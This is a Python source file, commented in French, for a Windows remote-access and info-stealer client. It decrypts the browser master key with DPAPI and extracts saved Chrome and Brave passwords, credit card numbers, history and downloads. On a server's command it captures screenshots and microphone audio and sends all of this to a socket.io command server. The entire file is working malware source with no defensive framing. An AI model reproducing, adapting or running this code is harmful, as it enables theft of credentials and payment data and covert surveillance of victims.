import base64
import io
import json
import os
import platform
import shutil
import sqlite3
import time
import wave
from datetime import datetime

import pyaudio
import pyautogui
import socketio
from Cryptodome.Cipher import AES
from PIL import Image
from win32crypt import CryptUnprotectData

# Configuration des chemins et des requêtes pour les navigateurs
appdata = os.getenv('LOCALAPPDATA')
browsers = {
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
}
data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Mot de passe'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Nom de la carte',
                    'Numéro de carte',
                    'Mois d\'expiration',
                    'Année d\'expiration',
                    'Date de modification'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Titre', 'Dernière visite'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['URL', 'Chemin de téléchargement'],
        'decrypt': False
    }
}

sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)

system_info = {
    'os': platform.system(),
    'os_version': platform.version(),
    'hostname': platform.node()
}


# Fonctions pour la gestion des données des navigateurs
def get_master_key(path: str):
    if not os.path.exists(path + "\\Local State"):
        return None
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return None
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    result = ""
    for row in cursor.fetchall():
        if type_of_data['decrypt']:
            row = [decrypt_password(x, key) if isinstance(x, bytes) else x for x in row]
        if type_of_data == data_queries['credit_cards']:
            credit_card = {
                'Nom de la carte': row[0],
                'Numéro de carte': ' '.join([row[1][i:i + 4] for i in range(0, len(row[1]), 4)]),
                'Date d\'éxpiration': f"{row[2]}/{row[3]}",
                'Date de modification': datetime.fromtimestamp(row[4]).strftime('%d/%m/%Y %H:%M:%S')
            }
            result += "\n".join([f"{key}: {val}" for key, val in credit_card.items()]) + "\n\n"
        else:
            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"

    conn.close()
    os.remove('temp_db')
    return result


def installed_browsers():
    return [x for x in browsers if os.path.exists(browsers[x])]


def send_browser_data():
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        for data_type_name, data_type in data_queries.items():
            data = get_data(browser_path, "Default", master_key, data_type)
            if data:
                sio.emit('browser_data_response', {'browser': browser, 'type': data_type_name, 'data': data})


def log_event(message):
    print(message)


@sio.event
def connect():
    log_event("Connection réussie")
    sio.emit('system_info', system_info)


@sio.event
def connect_error(data):
    log_event(f"Connection echouée: {data}")


@sio.event
def disconnect():
    log_event("Connection perdue")


@sio.event
def command(data):
    command = data.get('command')
    if command == 'screenshot':
        log_event("Commande de capture d'écran reçue")
        take_and_send_screenshot()
    elif command == 'audio':
        log_event("Commande d'enregistrement audio reçue")
        params = data.get('params', {})
        duration = int(params.get('duration', 10))
        record_and_send_audio(duration)
    elif command == 'browser_data':
        log_event("Commande de données de navigateur reçue")
        send_browser_data()
    else:
        log_event(f"Commande non reconnue: {command}")


def resize_image(image_bytes_io, base_width=1300):
    img = Image.open(image_bytes_io)
    w_percent = (base_width / float(img.size[0]))
    h_size = int((float(img.size[1]) * float(w_percent)))
    img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    return img_byte_arr


def take_and_send_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot_bytes_io = io.BytesIO()
        screenshot.save(screenshot_bytes_io, format='PNG')
        screenshot_bytes_io.seek(0)

        resized_screenshot = resize_image(screenshot_bytes_io)
        screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()

        if not sio.connected:
            log_event("En attente de connexion pour envoyer la capture d'écran...")
            time.sleep(1)
        sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
        log_event("Capture d'écran envoyée")
    except Exception as e:
        log_event(f"Echec de la capture d'écran: {e}")


def record_and_send_audio(duration=10):
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for i in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_bytes = b''.join(frames)
        audio_io = io.BytesIO()
        save_wave_file(audio_io, audio_bytes)

        audio_io.seek(0)
        audio_encoded = base64.b64encode(audio_io.read()).decode()

        if not sio.connected:
            log_event("En attente de connexion pour envoyer l'audio...")
        sio.emit('audio_response', {'audio': audio_encoded})
        log_event("Audio envoyé")
    except Exception as e:
        log_event(f"Echec de l'audio: {e}")


def save_wave_file(file_io, audio_data):
    with wave.open(file_io, 'wb') as wave_file:
        wave_file.setnchannels(1)
        wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
        wave_file.setframerate(44100)
        wave_file.writeframes(audio_data)


def attempt_reconnect():
    while not sio.connected:
        try:
            log_event("Tentative de reconnexion...")
            sio.connect('https://127.0.0.1:5000')
            time.sleep(5)
        except socketio.exceptions.ConnectionError:
            log_event("Echec de la reconnexion. Nouvelle tentative dans 5 secondes...")
            time.sleep(5)


def main():
    attempt_reconnect()
    try:
        sio.wait()
    except KeyboardInterrupt:
        log_event("Arrêt du client...")
        sio.disconnect()


if __name__ == '__main__':
    main()
